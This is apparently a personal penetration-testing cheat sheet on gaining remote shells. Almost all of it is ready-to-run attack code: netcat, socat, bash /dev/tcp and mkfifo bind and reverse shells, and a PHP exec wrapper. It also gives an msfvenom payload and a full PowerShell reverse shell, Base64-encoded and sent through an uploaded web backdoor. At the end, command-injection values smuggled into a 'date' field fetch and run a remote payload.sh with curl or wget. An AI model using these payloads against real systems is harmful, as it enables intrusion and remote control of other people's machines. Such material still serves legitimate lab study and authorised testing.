# Shells

It's not uncommon for host-based firewalls to block access to our bind shells. This can be incredibly frustrating at times, especially when under pressure and dealing with time constraints. When in doubt, we use a reverse shell as they are typically easier to troubleshoot.







## Resources
- <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheat
sheet.md#bash-tcp>
- <https://github.com/pentestmonkey>
- <https://www.revshells.com/>
- <https://ironhackers.es>
















## Bind Shell
Execute a listener on the Target.

The code executed on the target is used to start a listener attached to a shell directly on the target. This would then be opened up to the internet, meaning you can connect to the port that the code has opened and obtain remote code execution that way. This has the advantage of not requiring any configuration on your own network, but may be prevented by firewalls protecting the target.

### Snippets

Target:
`nc -lvnp <PORT> -e /bin/bash`

If we are looking to obtain a bind shell on a target then we can assume that there is already a listener waiting for us on a chosen port of the target: all we need to do is connect to it. 
Attacker:
`nc [TARGET IP] <PORT>`

Connecting to the above listener with netcat would result in a bind shell on the target.

Here we are using netcat to make an outbound connection to the target on our chosen port.


#### socat
On a Linux target we would use the following command:
`socat TCP-L:<PORT> EXEC:"bash -li"`

On a Windows target we would use this command for our listener:
`socat TCP-L:<PORT> EXEC:powershell.exe,pipes` (We use the "pipes" argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.)

Regardless of the target, we use this command on our attacking machine to connect to the waiting listener: `socat TCP:<TARGET-IP>:<TARGET-PORT> -`





























## Reverse Shell
require shellcode and a listener

If you choose to use a port below 1024, you will need to use `sudo` when starting your listener. That said, it's often a good idea to use a well-known port number (80, 443 or 53 being good choices) as this is more likely to get past outbound firewall rules on the target.


A reverse shell is a type of shell in which the target machine communicates back to the attacking machine. The attacking machine has a listening port, on which it receives the connection, resulting in code or command execution being achieved.

A web shell is a malicious script that enables an attacker to execute arbitrary commands on a remote web server simply by sending HTTP requests to the right endpoint.



### Snippets


#### netcat
Tip: use `rlwrap` to provide a readline-style editing of the command line
Ex: `sudo rlwrap nc -lvnp 443`

Target:
`nc [ATTACKER IP] 4444 -e /bin/bash`

Attacker:
`sudo nc -lnvp 4444`






#### socat

`socat TCP-L:<port> -` is equivalent to `nc -lvnp <port>`
On Windows: `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes` (The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.)



#### msfvenom
Example: generate a reverse shell payload using msfvenom:
`msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R`

-p = payload
lhost = our local host IP address (this is your machine's IP address)
lport = the port to listen on (this is the port on your machine)
R = export the payload in raw format


#### Bash
bash -c 'bash -i >& /dev/tcp/[ATTACKER MACHINE IP]/1234 0>&1'

#### PHP - Bash
exec("/bin/bash -c 'bash -i >& /dev/tcp/[ATTACKER MACHINE IP]/1234 0>&1'");
may have to scape the quotes
exec(\"/bin/bash -c 'bash -i >& /dev/tcp/[ATTACKER MACHINE IP]/1234 0>&1'\");





























## Encrypted Shell

`socat` is capable of creating encrypted shells, both bind and reverse. 
Encrypted shells cannot be spied on unless you have the decryption key, and are often able to bypass an IDS as a result.






































## Payloads

- <https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/>





On Linux use this code to create a listener for a BIND SHELL:
`mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`

A very similar command can be used to send a netcat REVERSE SHELL:
`mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`

More on `mkfifo`: <https://www.linuxjournal.com/article/2156>











- Bash reverse shell one-liner
```
bash -i >& /dev/tcp/192.168.119.3/4444 0>&1
```
Since we'll execute our command through the PHP system function, we should be aware that the command may be executed via the Bourne Shell, also known as `sh`, rather than Bash. This one-liner contains syntax that is not supported by the Bourne Shell.

To ensure the reverse shell is executed via Bash, we need to modify the reverse shell command. We can do this by providing the reverse shell one-liner as argument to `bash -c`, which executes a command with Bash.

- Bash reverse shell one-liner executed as command in Bash
```
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
```

Encode the special characters with URL encoding.
```
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
```








### Powershell REVERSE SHELL

- <https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3>




#### 1.a - clean and commented script

```powershell
$Text = @'
# Create a TCP client object that connects to the specified IP address and port
$client = New-Object System.Net.Sockets.TcpClient("192.168.45.233", 9999)

# Get the network stream for reading and writing data
$stream = $client.GetStream()

# Initialize a byte array with 65536 elements, all set to 0 (to be used as a buffer)
[byte[]]$bytes = 0..65535 | ForEach-Object {0}

# Start a loop that reads data from the stream until no more data is received
while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {

    # Convert the received byte data to a string using ASCII encoding
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    
    # Execute the received data as a PowerShell command and capture the output
    # 'iex' stands for 'Invoke-Expression', which executes a string as a command
    # '2>&1' redirects any errors to the standard output
    # 'Out-String' converts the output to a single string
    $sendback = (iex $data 2>&1 | Out-String)
    
    # Append the current directory (PS prompt) to the command output
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    
    # Convert the output string back to bytes using ASCII encoding
    $sendbyte = [text.encoding]::ASCII.GetBytes($sendback2)
    
    # Write the byte data back to the stream (sending it to the remote client)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    
    # Flush the stream to ensure all data is sent
    $stream.Flush()
}

# Close the client connection after the loop ends
$client.Close()
'@

```




#### 1.b - one-liner version

```powershell
$Text = '$client = New-Object System.Net.Sockets.TcpClient("[ATTACKER IP", [PORT]); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535 | ForEach-Object {0}; while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i); $sendback = (iex $data 2>&1 | Out-String); $sendback2 = $sendback + "PS " + (pwd).Path + "> "; $sendbyte = [text.encoding]::ASCII.GetBytes($sendback2); $stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush(); } $client.Close()'

```




#### 2 - Convert into an array of bytes encoded in Unicode
```powershell
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
```


#### 3 - convert the byte array stored in the $Bytes variable into a Base64-encoded string
```powershell
$EncodedText =[Convert]::ToBase64String($Bytes)
```





#### 4 - send the encoded payload
with the command `powershell -enc [ENCODED PAYLOAD]`
```
curl "http://mountaindesserts.com/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20[ENCODED PAYLOAD]"
```















### User input

1.
echo "/bin/bash -c 'exec bash -i >& /dev/tcp/[Attacker IP]/[Attacker Port] 0>&1'" > payload.sh

...
date=2025-05-09; curl http://10.10.14.8:8002/payload.sh|bash
...

2.
date=2025-05-09;wget+http://10.10.14.8:8002/payload.sh
y luego
date=2025-05-09;bash+payload.sh

3.
date=2025-05-09;bash+-c+'bash+-i+>%26+/dev/tcp/[Attacker IP]/[Attacker Port]+0>%261'





